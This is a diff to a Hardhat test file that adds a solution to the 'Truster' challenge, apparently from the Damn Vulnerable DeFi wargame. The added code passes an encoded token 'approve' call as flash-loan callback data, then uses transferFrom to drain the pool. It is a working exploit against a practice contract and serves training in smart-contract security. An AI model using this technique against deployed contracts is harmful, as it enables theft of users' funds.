@@ -11,6 +11,7 @@ describe('[Challenge] Truster', function () {
         [deployer, attacker] = await ethers.getSigners();
 
         const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
+        this.tokenFactory = DamnValuableToken;
         const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);
 
         this.token = await DamnValuableToken.deploy();
@@ -29,6 +30,23 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+
+        const interface = this.tokenFactory.interface;
+        const dataPayload = interface.encodeFunctionData("approve", [
+          attacker.address,
+          TOKENS_IN_POOL.toString()
+        ]);
+        await this.pool.connect(attacker).flashLoan(
+          0,
+          attacker.address,
+          this.token.address,
+          dataPayload,
+        )
+        this.token.connect(attacker).transferFrom(
+          this.pool.address,
+          attacker.address,
+          TOKENS_IN_POOL
+        );
     });
 
     after(async function () {
